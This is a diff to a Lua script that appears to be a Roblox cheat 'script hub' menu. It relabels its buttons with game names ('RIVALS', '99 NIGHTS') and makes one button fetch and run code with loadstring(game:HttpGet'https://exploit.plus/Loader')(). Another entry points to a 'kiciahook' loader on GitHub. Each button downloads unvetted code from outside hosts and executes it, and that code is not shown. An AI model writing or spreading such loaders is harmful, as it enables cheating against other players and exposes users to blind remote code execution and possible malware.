@@ -148,9 +148,9 @@ local function makeBtn(text, y)
     return b
 end
 
-local b1 = makeBtn("Script One", 45)
-local b2 = makeBtn("Script Two", 100)
-local b3 = makeBtn("Script Three", 155)
+local b1 = makeBtn("RIVALS (mobile)", 45)
+local b2 = makeBtn("RIVALS (PC)", 100)
+local b3 = makeBtn("99 NIGHTS", 155)
 
 local scripts = {
     "https://raw.githubusercontent.com/kiciahook/kiciahook/refs/heads/main/loader.lua",
@@ -163,7 +163,7 @@ b1.MouseButton1Click:Connect(function()
 end)
 
 b2.MouseButton1Click:Connect(function()
-    loadstring(game:HttpGet(scripts[2]))()
+    loadstring(game:HttpGet'https://exploit.plus/Loader')()
 end)
 
 b3.MouseButton1Click:Connect(function()
